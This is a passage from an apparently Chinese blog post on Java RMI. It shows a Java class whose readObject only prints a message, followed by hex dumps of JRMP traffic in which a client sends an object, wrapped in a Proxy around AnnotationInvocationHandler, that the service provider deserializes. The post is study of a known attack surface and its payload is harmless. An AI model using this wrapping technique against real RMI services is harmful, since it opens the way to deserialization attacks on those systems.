class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DeserializeObject</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream ois)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        ois.defaultReadObject();</span><br><span class="line">        System.out.println(<span class="string">"DeserializeObject.readObject"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>结果如下:  </p>
<p>RMIServiceProvider 输出:<br><img src="https://i.loli.net/2020/02/19/ur2VUMmH5l9IDvz.png" alt="2.png"></p>
<p>大致理解起来还是不太困难的, 客户端通过 <code>Registry</code>, 调用 <code>RMIServiceProvider</code> 上的服务.<br>可以看看 wireshark 的流量, 更清晰一些.  </p>
<p>Client &lt;-&gt; Registry 之间的流量, 缩进的是注册局发给客户端的</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">00000000  4a 52 4d 49 00 02 4b                               JRMI..K</span><br><span class="line">    00000000  4e 00 09 31 32 37 2e 30  2e 30 2e 31 00 00 84 58   N..127.0 .0.1...X</span><br><span class="line">00000007  00 09 31 32 37 2e 30 2e  31 2e 31 00 00 00 00      ..127.0. 1.1....</span><br><span class="line">00000016  50 ac ed 00 05 77 22 00  00 00 00 00 00 00 00 00   P....w&quot;. ........</span><br><span class="line">00000026  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00   ........ ........</span><br><span class="line">00000036  02 44 15 4d c9 d4 e6 3b  df 74 00 04 74 65 73 74   .D.M...; .t..test</span><br><span class="line">    00000010  51 ac ed 00 05 77 0f 01  e8 1f e8 41 00 00 01 70   Q....w.. ...A...p</span><br><span class="line">    00000020  5d a3 bd 51 80 0c 73 7d  00 00 00 01 00 16 64 65   ]..Q..s&#125; ......de</span><br><span class="line">    00000030  6d 6f 2e 72 6d 62 31 32  32 2e 54 65 73 74 4f 62   mo.rmb12 2.TestOb</span><br><span class="line">    00000040  6a 65 63 74 70 78 72 00  17 6a 61 76 61 2e 6c 61   jectpxr. .java.la</span><br><span class="line">    00000050  6e 67 2e 72 65 66 6c 65  63 74 2e 50 72 6f 78 79   ng.refle ct.Proxy</span><br><span class="line">    00000060  e1 27 da 20 cc 10 43 cb  02 00 01 4c 00 01 68 74   .&#39;. ..C. ...L..ht</span><br><span class="line">    00000070  00 25 4c 6a 61 76 61 2f  6c 61 6e 67 2f 72 65 66   .%Ljava&#x2F; lang&#x2F;ref</span><br><span class="line">    00000080  6c 65 63 74 2f 49 6e 76  6f 63 61 74 69 6f 6e 48   lect&#x2F;Inv ocationH</span><br><span class="line">    00000090  61 6e 64 6c 65 72 3b 70  78 70 73 72 00 2d 6a 61   andler;p xpsr.-ja</span><br><span class="line">    000000A0  76 61 2e 72 6d 69 2e 73  65 72 76 65 72 2e 52 65   va.rmi.s erver.Re</span><br><span class="line">    000000B0  6d 6f 74 65 4f 62 6a 65  63 74 49 6e 76 6f 63 61   moteObje ctInvoca</span><br><span class="line">    000000C0  74 69 6f 6e 48 61 6e 64  6c 65 72 00 00 00 00 00   tionHand ler.....</span><br><span class="line">    000000D0  00 00 02 02 00 00 70 78  72 00 1c 6a 61 76 61 2e   ......px r..java.</span><br><span class="line">    000000E0  72 6d 69 2e 73 65 72 76  65 72 2e 52 65 6d 6f 74   rmi.serv er.Remot</span><br><span class="line">    000000F0  65 4f 62 6a 65 63 74 d3  61 b4 91 0c 61 33 1e 03   eObject. a...a3..</span><br><span class="line">    00000100  00 00 70 78 70 77 32 00  0a 55 6e 69 63 61 73 74   ..pxpw2. .Unicast</span><br><span class="line">    00000110  52 65 66 00 09 31 32 37  2e 30 2e 31 2e 31 00 00   Ref..127 .0.1.1..</span><br><span class="line">    00000120  a9 83 27 2e 2f a2 08 49  09 8f ab a0 76 97 00 00   ..&#39;.&#x2F;..I ....v...</span><br><span class="line">    00000130  01 70 5d a6 5c 22 80 01  01 78                     .p].\&quot;.. .x</span><br><span class="line">00000046  52                                                 R</span><br><span class="line">    0000013A  53                                                 S</span><br><span class="line">00000047  54 e8 1f e8 41 00 00 01  70 5d a3 bd 51 80 0c      T...A... p]..Q..</span><br></pre></td></tr></table></figure>

<p>Client &lt;-&gt; RMIServiceProvider 之间的流量, 缩进的是服务提供者发给客户端的</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">00000000  4a 52 4d 49 00 02 4b                               JRMI..K</span><br><span class="line">    00000000  4e 00 09 31 32 37 2e 30  2e 30 2e 31 00 00 c1 c2   N..127.0 .0.1....</span><br><span class="line">00000007  00 09 31 32 37 2e 30 2e  31 2e 31 00 00 00 00      ..127.0. 1.1....</span><br><span class="line">00000016  50 ac ed 00 05 77 22 00  00 00 00 00 00 00 02 00   P....w&quot;. ........</span><br><span class="line">00000026  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00   ........ ........</span><br><span class="line">00000036  01 f6 b6 89 8d 8b f2 86  43 75 72 00 18 5b 4c 6a   ........ Cur..[Lj</span><br><span class="line">00000046  61 76 61 2e 72 6d 69 2e  73 65 72 76 65 72 2e 4f   ava.rmi. server.O</span><br><span class="line">00000056  62 6a 49 44 3b 87 13 00  b8 d0 2c 64 7e 02 00 00   bjID;... ..,d~...</span><br><span class="line">00000066  70 78 70 00 00 00 01 73  72 00 15 6a 61 76 61 2e   pxp....s r..java.</span><br><span class="line">00000076  72 6d 69 2e 73 65 72 76  65 72 2e 4f 62 6a 49 44   rmi.serv er.ObjID</span><br><span class="line">00000086  a7 5e fa 12 8d dc e5 5c  02 00 02 4a 00 06 6f 62   .^.....\ ...J..ob</span><br><span class="line">00000096  6a 4e 75 6d 4c 00 05 73  70 61 63 65 74 00 15 4c   jNumL..s pacet..L</span><br><span class="line">000000A6  6a 61 76 61 2f 72 6d 69  2f 73 65 72 76 65 72 2f   java&#x2F;rmi &#x2F;server&#x2F;</span><br><span class="line">000000B6  55 49 44 3b 70 78 70 27  2e 2f a2 08 49 09 8f 73   UID;pxp&#39; .&#x2F;..I..s</span><br><span class="line">000000C6  72 00 13 6a 61 76 61 2e  72 6d 69 2e 73 65 72 76   r..java. rmi.serv</span><br><span class="line">000000D6  65 72 2e 55 49 44 0f 12  70 0d bf 36 4f 12 02 00   er.UID.. p..6O...</span><br><span class="line">000000E6  03 53 00 05 63 6f 75 6e  74 4a 00 04 74 69 6d 65   .S..coun tJ..time</span><br><span class="line">000000F6  49 00 06 75 6e 69 71 75  65 70 78 70 80 01 00 00   I..uniqu epxp....</span><br><span class="line">00000106  01 70 5d a6 5c 22 ab a0  76 97 77 08 80 00 00 00   .p].\&quot;.. v.w.....</span><br><span class="line">00000116  00 00 00 00 73 72 00 12  6a 61 76 61 2e 72 6d 69   ....sr.. java.rmi</span><br><span class="line">00000126  2e 64 67 63 2e 4c 65 61  73 65 b0 b5 e2 66 0c 4a   .dgc.Lea se...f.J</span><br><span class="line">00000136  dc 34 02 00 02 4a 00 05  76 61 6c 75 65 4c 00 04   .4...J.. valueL..</span><br><span class="line">00000146  76 6d 69 64 74 00 13 4c  6a 61 76 61 2f 72 6d 69   vmidt..L java&#x2F;rmi</span><br><span class="line">00000156  2f 64 67 63 2f 56 4d 49  44 3b 70 78 70 00 00 00   &#x2F;dgc&#x2F;VMI D;pxp...</span><br><span class="line">00000166  00 00 09 27 c0 73 72 00  11 6a 61 76 61 2e 72 6d   ...&#39;.sr. .java.rm</span><br><span class="line">00000176  69 2e 64 67 63 2e 56 4d  49 44 f8 86 5b af a4 a5   i.dgc.VM ID..[...</span><br><span class="line">00000186  6d b6 02 00 02 5b 00 04  61 64 64 72 74 00 02 5b   m....[.. addrt..[</span><br><span class="line">00000196  42 4c 00 03 75 69 64 71  00 7e 00 03 70 78 70 75   BL..uidq .~..pxpu</span><br><span class="line">000001A6  72 00 02 5b 42 ac f3 17  f8 06 08 54 e0 02 00 00   r..[B... ...T....</span><br><span class="line">000001B6  70 78 70 00 00 00 08 f7  88 3b 04 59 fc a2 27 73   pxp..... .;.Y..&#39;s</span><br><span class="line">000001C6  71 00 7e 00 05 80 01 00  00 01 70 5d aa ea e5 dd   q.~..... ..p]....</span><br><span class="line">000001D6  bd ea 1a                                           ...</span><br><span class="line">    00000010  51 ac ed 00 05 77 0f 01  ab a0 76 97 00 00 01 70   Q....w.. ..v....p</span><br><span class="line">    00000020  5d a6 5c 22 80 05 73 72  00 12 6a 61 76 61 2e 72   ].\&quot;..sr ..java.r</span><br><span class="line">    00000030  6d 69 2e 64 67 63 2e 4c  65 61 73 65 b0 b5 e2 66   mi.dgc.L ease...f</span><br><span class="line">    00000040  0c 4a dc 34 02 00 02 4a  00 05 76 61 6c 75 65 4c   .J.4...J ..valueL</span><br><span class="line">    00000050  00 04 76 6d 69 64 74 00  13 4c 6a 61 76 61 2f 72   ..vmidt. .Ljava&#x2F;r</span><br><span class="line">    00000060  6d 69 2f 64 67 63 2f 56  4d 49 44 3b 70 78 70 00   mi&#x2F;dgc&#x2F;V MID;pxp.</span><br><span class="line">    00000070  00 00 00 00 09 27 c0 73  72 00 11 6a 61 76 61 2e   .....&#39;.s r..java.</span><br><span class="line">    00000080  72 6d 69 2e 64 67 63 2e  56 4d 49 44 f8 86 5b af   rmi.dgc. VMID..[.</span><br><span class="line">    00000090  a4 a5 6d b6 02 00 02 5b  00 04 61 64 64 72 74 00   ..m....[ ..addrt.</span><br><span class="line">    000000A0  02 5b 42 4c 00 03 75 69  64 74 00 15 4c 6a 61 76   .[BL..ui dt..Ljav</span><br><span class="line">    000000B0  61 2f 72 6d 69 2f 73 65  72 76 65 72 2f 55 49 44   a&#x2F;rmi&#x2F;se rver&#x2F;UID</span><br><span class="line">    000000C0  3b 70 78 70 75 72 00 02  5b 42 ac f3 17 f8 06 08   ;pxpur.. [B......</span><br><span class="line">    000000D0  54 e0 02 00 00 70 78 70  00 00 00 08 f7 88 3b 04   T....pxp ......;.</span><br><span class="line">    000000E0  59 fc a2 27 73 72 00 13  6a 61 76 61 2e 72 6d 69   Y..&#39;sr.. java.rmi</span><br><span class="line">    000000F0  2e 73 65 72 76 65 72 2e  55 49 44 0f 12 70 0d bf   .server. UID..p..</span><br><span class="line">    00000100  36 4f 12 02 00 03 53 00  05 63 6f 75 6e 74 4a 00   6O....S. .countJ.</span><br><span class="line">    00000110  04 74 69 6d 65 49 00 06  75 6e 69 71 75 65 70 78   .timeI.. uniquepx</span><br><span class="line">    00000120  70 80 01 00 00 01 70 5d  aa ea e5 dd bd ea 1a      p.....p] .......</span><br><span class="line">000001D9  52                                                 R</span><br><span class="line">    0000012F  53                                                 S</span><br><span class="line">000001DA  50 ac ed 00 05 77 22 27  2e 2f a2 08 49 09 8f ab   P....w&quot;&#39; .&#x2F;..I...</span><br><span class="line">000001EA  a0 76 97 00 00 01 70 5d  a6 5c 22 80 01 ff ff ff   .v....p] .\&quot;.....</span><br><span class="line">000001FA  ff d9 0d 2f 12 e0 71 7f  42 73 7d 00 00 00 01 00   ...&#x2F;..q. Bs&#125;.....</span><br><span class="line">0000020A  11 64 65 6d 6f 2e 72 6d  62 31 32 32 2e 44 75 6d   .demo.rm b122.Dum</span><br><span class="line">0000021A  6d 79 70 78 72 00 17 6a  61 76 61 2e 6c 61 6e 67   mypxr..j ava.lang</span><br><span class="line">0000022A  2e 72 65 66 6c 65 63 74  2e 50 72 6f 78 79 e1 27   .reflect .Proxy.&#39;</span><br><span class="line">0000023A  da 20 cc 10 43 cb 02 00  01 4c 00 01 68 74 00 25   . ..C... .L..ht.%</span><br><span class="line">0000024A  4c 6a 61 76 61 2f 6c 61  6e 67 2f 72 65 66 6c 65   Ljava&#x2F;la ng&#x2F;refle</span><br><span class="line">0000025A  63 74 2f 49 6e 76 6f 63  61 74 69 6f 6e 48 61 6e   ct&#x2F;Invoc ationHan</span><br><span class="line">0000026A  64 6c 65 72 3b 70 78 70  73 72 00 32 73 75 6e 2e   dler;pxp sr.2sun.</span><br><span class="line">0000027A  72 65 66 6c 65 63 74 2e  61 6e 6e 6f 74 61 74 69   reflect. annotati</span><br><span class="line">0000028A  6f 6e 2e 41 6e 6e 6f 74  61 74 69 6f 6e 49 6e 76   on.Annot ationInv</span><br><span class="line">0000029A  6f 63 61 74 69 6f 6e 48  61 6e 64 6c 65 72 55 ca   ocationH andlerU.</span><br><span class="line">000002AA  f5 0f 15 cb 7e a5 02 00  02 4c 00 0c 6d 65 6d 62   ....~... .L..memb</span><br><span class="line">000002BA  65 72 56 61 6c 75 65 73  74 00 0f 4c 6a 61 76 61   erValues t..Ljava</span><br><span class="line">000002CA  2f 75 74 69 6c 2f 4d 61  70 3b 4c 00 04 74 79 70   &#x2F;util&#x2F;Ma p;L..typ</span><br><span class="line">000002DA  65 74 00 11 4c 6a 61 76  61 2f 6c 61 6e 67 2f 43   et..Ljav a&#x2F;lang&#x2F;C</span><br><span class="line">000002EA  6c 61 73 73 3b 70 78 70  73 72 00 11 6a 61 76 61   lass;pxp sr..java</span><br><span class="line">000002FA  2e 75 74 69 6c 2e 48 61  73 68 4d 61 70 05 07 da   .util.Ha shMap...</span><br><span class="line">0000030A  c1 c3 16 60 d1 03 00 02  46 00 0a 6c 6f 61 64 46   ...&#96;.... F..loadF</span><br><span class="line">0000031A  61 63 74 6f 72 49 00 09  74 68 72 65 73 68 6f 6c   actorI.. threshol</span><br><span class="line">0000032A  64 70 78 70 3f 40 00 00  00 00 00 0c 77 08 00 00   dpxp?@.. ....w...</span><br><span class="line">0000033A  00 10 00 00 00 01 74 00  03 61 61 61 73 72 00 1d   ......t. .aaasr..</span><br><span class="line">0000034A  64 65 6d 6f 2e 72 6d 62  31 32 32 2e 44 65 73 65   demo.rmb 122.Dese</span><br><span class="line">0000035A  72 69 61 6c 69 7a 65 4f  62 6a 65 63 74 e7 b9 28   rializeO bject..(</span><br><span class="line">0000036A  12 38 24 61 0c 02 00 00  70 78 70 78 76 72 00 14   .8$a.... pxpxvr..</span><br><span class="line">0000037A  6a 61 76 61 2e 6c 61 6e  67 2e 44 65 70 72 65 63   java.lan g.Deprec</span><br><span class="line">0000038A  61 74 65 64 00 00 00 00  00 00 00 00 00 00 00 70   ated.... .......p</span><br><span class="line">0000039A  78 70                                              xp</span><br><span class="line">    00000130  51 ac ed 00 05 77 0f 02  ab a0 76 97 00 00 01 70   Q....w.. ..v....p</span><br><span class="line">    00000140  5d a6 5c 22 80 06 73 72  00 1e 6a 61 76 61 2e 6c   ].\&quot;..sr ..java.l</span><br><span class="line">    00000150  61 6e 67 2e 4e 75 6c 6c  50 6f 69 6e 74 65 72 45   ang.Null PointerE</span><br><span class="line">    00000160  78 63 65 70 74 69 6f 6e  47 a5 a1 8e ff 31 e1 b8   xception G....1..</span><br><span class="line">    00000170  02 00 00 70 78 72 00 1a  6a 61 76 61 2e 6c 61 6e   ...pxr.. java.lan</span><br><span class="line">    00000180  67 2e 52 75 6e 74 69 6d  65 45 78 63 65 70 74 69   g.Runtim eExcepti</span><br><span class="line">    00000190  6f 6e 9e 5f 06 47 0a 34  83 e5 02 00 00 70 78 72   on._.G.4 .....pxr</span><br><span class="line">    000001A0  00 13 6a 61 76 61 2e 6c  61 6e 67 2e 45 78 63 65   ..java.l ang.Exce</span><br><span class="line">    000001B0  70 74 69 6f 6e d0 fd 1f  3e 1a 3b 1c c4 02 00 00   ption... &gt;.;.....</span><br><span class="line">    000001C0  70 78 72 00 13 6a 61 76  61 2e 6c 61 6e 67 2e 54   pxr..jav a.lang.T</span><br><span class="line">    000001D0  68 72 6f 77 61 62 6c 65  d5 c6 35 27 39 77 b8 cb   hrowable ..5&#39;9w..</span><br><span class="line">    000001E0  03 00 04 4c 00 05 63 61  75 73 65 74 00 15 4c 6a   ...L..ca uset..Lj</span><br><span class="line">    000001F0  61 76 61 2f 6c 61 6e 67  2f 54 68 72 6f 77 61 62   ava&#x2F;lang &#x2F;Throwab</span><br><span class="line">    00000200  6c 65 3b 4c 00 0d 64 65  74 61 69 6c 4d 65 73 73   le;L..de tailMess</span><br><span class="line">    00000210  61 67 65 74 00 12 4c 6a  61 76 61 2f 6c 61 6e 67   aget..Lj ava&#x2F;lang</span><br><span class="line">    00000220  2f 53 74 72 69 6e 67 3b  5b 00 0a 73 74 61 63 6b   &#x2F;String; [..stack</span><br><span class="line">    00000230  54 72 61 63 65 74 00 1e  5b 4c 6a 61 76 61 2f 6c   Tracet.. [Ljava&#x2F;l</span><br><span class="line">    00000240  61 6e 67 2f 53 74 61 63  6b 54 72 61 63 65 45 6c   ang&#x2F;Stac kTraceEl</span><br><span class="line">    00000250  65 6d 65 6e 74 3b 4c 00  14 73 75 70 70 72 65 73   ement;L. .suppres</span><br><span class="line">    00000260  73 65 64 45 78 63 65 70  74 69 6f 6e 73 74 00 10   sedExcep tionst..</span><br><span class="line">    00000270  4c 6a 61 76 61 2f 75 74  69 6c 2f 4c 69 73 74 3b   Ljava&#x2F;ut il&#x2F;List;</span><br><span class="line">    00000280  70 78 70 71 00 7e 00 08  70 75 72 00 1e 5b 4c 6a   pxpq.~.. pur..[Lj</span><br><span class="line">    00000290  61 76 61 2e 6c 61 6e 67  2e 53 74 61 63 6b 54 72   ava.lang .StackTr</span><br><span class="line">    000002A0  61 63 65 45 6c 65 6d 65  6e 74 3b 02 46 2a 3c 3c   aceEleme nt;.F*&lt;&lt;</span><br><span class="line">    000002B0  fd 22 39 02 00 00 70 78  70 00 00 00 17 73 72 00   .&quot;9...px p....sr.</span><br><span class="line">    000002C0  1b 6a 61 76 61 2e 6c 61  6e 67 2e 53 74 61 63 6b   .java.la ng.Stack</span><br><span class="line">    000002D0  54 72 61 63 65 45 6c 65  6d 65 6e 74 61 09 c5 9a   TraceEle menta...</span><br><span class="line">    000002E0  26 36 dd 85 02 00 08 42  00 06 66 6f 72 6d 61 74   &amp;6.....B ..format</span><br><span class="line">    000002F0  49 00 0a 6c 69 6e 65 4e  75 6d 62 65 72 4c 00 0f   I..lineN umberL..</span><br><span class="line">    00000300  63 6c 61 73 73 4c 6f 61  64 65 72 4e 61 6d 65 71   classLoa derNameq</span><br><span class="line">    00000310  00 7e 00 05 4c 00 0e 64  65 63 6c 61 72 69 6e 67   .~..L..d eclaring</span><br><span class="line">    00000320  43 6c 61 73 73 71 00 7e  00 05 4c 00 08 66 69 6c   Classq.~ ..L..fil</span><br><span class="line">    00000330  65 4e 61 6d 65 71 00 7e  00 05 4c 00 0a 6d 65 74   eNameq.~ ..L..met</span><br><span class="line">    00000340  68 6f 64 4e 61 6d 65 71  00 7e 00 05 4c 00 0a 6d   hodNameq .~..L..m</span><br><span class="line">    00000350  6f 64 75 6c 65 4e 61 6d  65 71 00 7e 00 05 4c 00   oduleNam eq.~..L.</span><br><span class="line">    00000360  0d 6d 6f 64 75 6c 65 56  65 72 73 69 6f 6e 71 00   .moduleV ersionq.</span><br><span class="line">    00000370  7e 00 05 70 78 70 02 00  00 00 a6 70 74 00 32 73   ~..pxp.. ...pt.2s</span><br><span class="line">    00000380  75 6e 2e 72 65 66 6c 65  63 74 2e 61 6e 6e 6f 74   un.refle ct.annot</span><br><span class="line">    00000390  61 74 69 6f 6e 2e 41 6e  6e 6f 74 61 74 69 6f 6e   ation.An notation</span><br><span class="line">    000003A0  49 6e 76 6f 63 61 74 69  6f 6e 48 61 6e 64 6c 65   Invocati onHandle</span><br><span class="line">    000003B0  72 74 00 20 41 6e 6e 6f  74 61 74 69 6f 6e 49 6e   rt. Anno tationIn</span><br><span class="line">    000003C0  76 6f 63 61 74 69 6f 6e  48 61 6e 64 6c 65 72 2e   vocation Handler.</span><br><span class="line">    000003D0  6a 61 76 61 74 00 13 6d  65 6d 62 65 72 56 61 6c   javat..m emberVal</span><br><span class="line">    000003E0  75 65 54 6f 53 74 72 69  6e 67 74 00 09 6a 61 76   ueToStri ngt..jav</span><br><span class="line">    000003F0  61 2e 62 61 73 65 74 00  06 31 31 2e 30 2e 36 73   a.baset. .11.0.6s</span><br><span class="line">    00000400  71 00 7e 00 0b 02 00 00  00 9c 70 71 00 7e 00 0d   q.~..... ..pq.~..</span><br><span class="line">    00000410  71 00 7e 00 0e 74 00 0c  74 6f 53 74 72 69 6e 67   q.~..t.. toString</span><br><span class="line">    00000420  49 6d 70 6c 71 00 7e 00  10 71 00 7e 00 11 73 71   Implq.~. .q.~..sq</span><br><span class="line">    00000430  00 7e 00 0b 02 00 00 00  48 70 71 00 7e 00 0d 71   .~...... Hpq.~..q</span><br><span class="line">    00000440  00 7e 00 0e 74 00 06 69  6e 76 6f 6b 65 71 00 7e   .~..t..i nvokeq.~</span><br><span class="line">    00000450  00 10 71 00 7e 00 11 73  71 00 7e 00 0b 01 ff ff   ..q.~..s q.~.....</span><br><span class="line">    00000460  ff ff 74 00 03 61 70 70  74 00 15 63 6f 6d 2e 73   ..t..app t..com.s</span><br><span class="line">    00000470  75 6e 2e 70 72 6f 78 79  2e 24 50 72 6f 78 79 31   un.proxy .$Proxy1</span><br><span class="line">    00000480  70 74 00 08 74 6f 53 74  72 69 6e 67 70 70 73 71   pt..toSt ringppsq</span><br><span class="line">    00000490  00 7e 00 0b 02 00 00 0b  87 70 74 00 10 6a 61 76   .~...... .pt..jav</span><br><span class="line">    000004A0  61 2e 6c 61 6e 67 2e 53  74 72 69 6e 67 74 00 0b   a.lang.S tringt..</span><br><span class="line">    000004B0  53 74 72 69 6e 67 2e 6a  61 76 61 74 00 07 76 61   String.j avat..va</span><br><span class="line">    000004C0  6c 75 65 4f 66 71 00 7e  00 10 71 00 7e 00 11 73   lueOfq.~ ..q.~..s</span><br><span class="line">    000004D0  71 00 7e 00 0b 01 00 00  00 06 71 00 7e 00 17 74   q.~..... ..q.~..t</span><br><span class="line">    000004E0  00 1a 64 65 6d 6f 2e 72  6d 62 31 32 32 2e 54 65   ..demo.r mb122.Te</span><br><span class="line">    000004F0  73 74 4f 62 6a 65 63 74  49 6d 70 6c 74 00 13 54   stObject Implt..T</span><br><span class="line">    00000500  65 73 74 4f 62 6a 65 63  74 49 6d 70 6c 2e 6a 61   estObjec tImpl.ja</span><br><span class="line">    00000510  76 61 74 00 06 63 61 6c  6c 4d 65 70 70 73 71 00   vat..cal lMeppsq.</span><br><span class="line">    00000520  7e 00 0b 02 ff ff ff fe  70 74 00 2d 6a 64 6b 2e   ~....... pt.-jdk.</span><br><span class="line">    00000530  69 6e 74 65 72 6e 61 6c  2e 72 65 66 6c 65 63 74   internal .reflect</span><br><span class="line">    00000540  2e 4e 61 74 69 76 65 4d  65 74 68 6f 64 41 63 63   .NativeM ethodAcc</span><br><span class="line">    00000550  65 73 73 6f 72 49 6d 70  6c 74 00 1d 4e 61 74 69   essorImp lt..Nati</span><br><span class="line">    00000560  76 65 4d 65 74 68 6f 64  41 63 63 65 73 73 6f 72   veMethod Accessor</span><br><span class="line">    00000570  49 6d 70 6c 2e 6a 61 76  61 74 00 07 69 6e 76 6f   Impl.jav at..invo</span><br><span class="line">    00000580  6b 65 30 71 00 7e 00 10  71 00 7e 00 11 73 71 00   ke0q.~.. q.~..sq.</span><br><span class="line">    00000590  7e 00 0b 02 00 00 00 3e  70 71 00 7e 00 23 71 00   ~......&gt; pq.~.#q.</span><br><span class="line">    000005A0  7e 00 24 71 00 7e 00 15  71 00 7e 00 10 71 00 7e   ~.$q.~.. q.~..q.~</span><br><span class="line">    000005B0  00 11 73 71 00 7e 00 0b  02 00 00 00 2b 70 74 00   ..sq.~.. ....+pt.</span><br><span class="line">    000005C0  31 6a 64 6b 2e 69 6e 74  65 72 6e 61 6c 2e 72 65   1jdk.int ernal.re</span><br><span class="line">    000005D0  66 6c 65 63 74 2e 44 65  6c 65 67 61 74 69 6e 67   flect.De legating</span><br><span class="line">    000005E0  4d 65 74 68 6f 64 41 63  63 65 73 73 6f 72 49 6d   MethodAc cessorIm</span><br><span class="line">    000005F0  70 6c 74 00 21 44 65 6c  65 67 61 74 69 6e 67 4d   plt.!Del egatingM</span><br><span class="line">    00000600  65 74 68 6f 64 41 63 63  65 73 73 6f 72 49 6d 70   ethodAcc essorImp</span><br><span class="line">    00000610  6c 2e 6a 61 76 61 71 00  7e 00 15 71 00 7e 00 10   l.javaq. ~..q.~..</span><br><span class="line">    00000620  71 00 7e 00 11 73 71 00  7e 00 0b 02 00 00 02 36   q.~..sq. ~......6</span><br><span class="line">    00000630  70 74 00 18 6a 61 76 61  2e 6c 61 6e 67 2e 72 65   pt..java .lang.re</span><br><span class="line">    00000640  66 6c 65 63 74 2e 4d 65  74 68 6f 64 74 00 0b 4d   flect.Me thodt..M</span><br><span class="line">    00000650  65 74 68 6f 64 2e 6a 61  76 61 71 00 7e 00 15 71   ethod.ja vaq.~..q</span><br><span class="line">    00000660  00 7e 00 10 71 00 7e 00  11 73 71 00 7e 00 0b 02   .~..q.~. .sq.~...</span><br><span class="line">    00000670  00 00 01 67 70 74 00 1f  73 75 6e 2e 72 6d 69 2e   ...gpt.. sun.rmi.</span><br><span class="line">    00000680  73 65 72 76 65 72 2e 55  6e 69 63 61 73 74 53 65   server.U nicastSe</span><br><span class="line">    00000690  72 76 65 72 52 65 66 74  00 15 55 6e 69 63 61 73   rverReft ..Unicas</span><br><span class="line">    000006A0  74 53 65 72 76 65 72 52  65 66 2e 6a 61 76 61 74   tServerR ef.javat</span><br><span class="line">    000006B0  00 08 64 69 73 70 61 74  63 68 74 00 08 6a 61 76   ..dispat cht..jav</span><br><span class="line">    000006C0  61 2e 72 6d 69 71 00 7e  00 11 73 71 00 7e 00 0b   a.rmiq.~ ..sq.~..</span><br><span class="line">    000006D0  02 00 00 00 c8 70 74 00  1d 73 75 6e 2e 72 6d 69   .....pt. .sun.rmi</span><br><span class="line">    000006E0  2e 74 72 61 6e 73 70 6f  72 74 2e 54 72 61 6e 73   .transpo rt.Trans</span><br><span class="line">    000006F0  70 6f 72 74 24 31 74 00  0e 54 72 61 6e 73 70 6f   port$1t. .Transpo</span><br><span class="line">    00000700  72 74 2e 6a 61 76 61 74  00 03 72 75 6e 71 00 7e   rt.javat ..runq.~</span><br><span class="line">    00000710  00 31 71 00 7e 00 11 73  71 00 7e 00 0b 02 00 00   .1q.~..s q.~.....</span><br><span class="line">    00000720  00 c5 70 71 00 7e 00 33  71 00 7e 00 34 71 00 7e   ..pq.~.3 q.~.4q.~</span><br><span class="line">    00000730  00 35 71 00 7e 00 31 71  00 7e 00 11 73 71 00 7e   .5q.~.1q .~..sq.~</span><br><span class="line">    00000740  00 0b 02 ff ff ff fe 70  74 00 1e 6a 61 76 61 2e   .......p t..java.</span><br><span class="line">    00000750  73 65 63 75 72 69 74 79  2e 41 63 63 65 73 73 43   security .AccessC</span><br><span class="line">    00000760  6f 6e 74 72 6f 6c 6c 65  72 74 00 15 41 63 63 65   ontrolle rt..Acce</span><br><span class="line">    00000770  73 73 43 6f 6e 74 72 6f  6c 6c 65 72 2e 6a 61 76   ssContro ller.jav</span><br><span class="line">    00000780  61 74 00 0c 64 6f 50 72  69 76 69 6c 65 67 65 64   at..doPr ivileged</span><br><span class="line">    00000790  71 00 7e 00 10 71 00 7e  00 11 73 71 00 7e 00 0b   q.~..q.~ ..sq.~..</span><br><span class="line">    000007A0  02 00 00 00 c4 70 74 00  1b 73 75 6e 2e 72 6d 69   .....pt. .sun.rmi</span><br><span class="line">    000007B0  2e 74 72 61 6e 73 70 6f  72 74 2e 54 72 61 6e 73   .transpo rt.Trans</span><br><span class="line">    000007C0  70 6f 72 74 71 00 7e 00  34 74 00 0b 73 65 72 76   portq.~. 4t..serv</span><br><span class="line">    000007D0  69 63 65 43 61 6c 6c 71  00 7e 00 31 71 00 7e 00   iceCallq .~.1q.~.</span><br><span class="line">    000007E0  11 73 71 00 7e 00 0b 02  00 00 02 32 70 74 00 22   .sq.~... ...2pt.&quot;</span><br><span class="line">    000007F0  73 75 6e 2e 72 6d 69 2e  74 72 61 6e 73 70 6f 72   sun.rmi. transpor</span><br><span class="line">    00000800  74 2e 74 63 70 2e 54 43  50 54 72 61 6e 73 70 6f   t.tcp.TC PTranspo</span><br><span class="line">    00000810  72 74 74 00 11 54 43 50  54 72 61 6e 73 70 6f 72   rtt..TCP Transpor</span><br><span class="line">    00000820  74 2e 6a 61 76 61 74 00  0e 68 61 6e 64 6c 65 4d   t.javat. .handleM</span><br><span class="line">    00000830  65 73 73 61 67 65 73 71  00 7e 00 31 71 00 7e 00   essagesq .~.1q.~.</span><br><span class="line">    00000840  11 73 71 00 7e 00 0b 02  00 00 03 1c 70 74 00 34   .sq.~... ....pt.4</span><br><span class="line">    00000850  73 75 6e 2e 72 6d 69 2e  74 72 61 6e 73 70 6f 72   sun.rmi. transpor</span><br><span class="line">    00000860  74 2e 74 63 70 2e 54 43  50 54 72 61 6e 73 70 6f   t.tcp.TC PTranspo</span><br><span class="line">    00000870  72 74 24 43 6f 6e 6e 65  63 74 69 6f 6e 48 61 6e   rt$Conne ctionHan</span><br><span class="line">    00000880  64 6c 65 72 71 00 7e 00  40 74 00 04 72 75 6e 30   dlerq.~. @t..run0</span><br><span class="line">    00000890  71 00 7e 00 31 71 00 7e  00 11 73 71 00 7e 00 0b   q.~.1q.~ ..sq.~..</span><br><span class="line">    000008A0  02 00 00 02 a5 70 71 00  7e 00 43 71 00 7e 00 40   .....pq. ~.Cq.~.@</span><br><span class="line">    000008B0  74 00 0c 6c 61 6d 62 64  61 24 72 75 6e 24 30 71   t..lambd a$run$0q</span><br><span class="line">    000008C0  00 7e 00 